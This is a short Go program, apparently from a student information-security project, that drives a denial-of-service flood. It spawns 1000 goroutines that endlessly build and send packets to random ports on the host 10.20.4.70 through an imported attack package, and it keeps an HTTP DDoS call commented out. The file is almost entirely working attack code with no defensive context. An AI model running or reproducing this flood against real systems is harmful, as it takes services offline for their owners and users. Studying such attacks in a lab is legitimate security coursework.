package main

import (
	"log"
	"math/rand"

	"github.com/talkanbaev-artur/information-security-final-project/ddos/attacks"
)

func main() {
	var ch chan bool
	for i := 0; i < 1000; i++ {
		go func() {
			for {
				port := rand.Intn(64000) + 1024
				err, header, data := attacks.ConstructPacket("10.20.4.70", port)
				if err != nil {
					log.Fatal(err)
				}
				err = attacks.SendPacket(header, data)
				if err != nil {
					log.Println("Error during sending packet")
					log.Fatal(err)
				}
				//attacks.DD0SHttp("http://10.20.4.70:8000/", false)
			}
		}()
	}
	<-ch
}
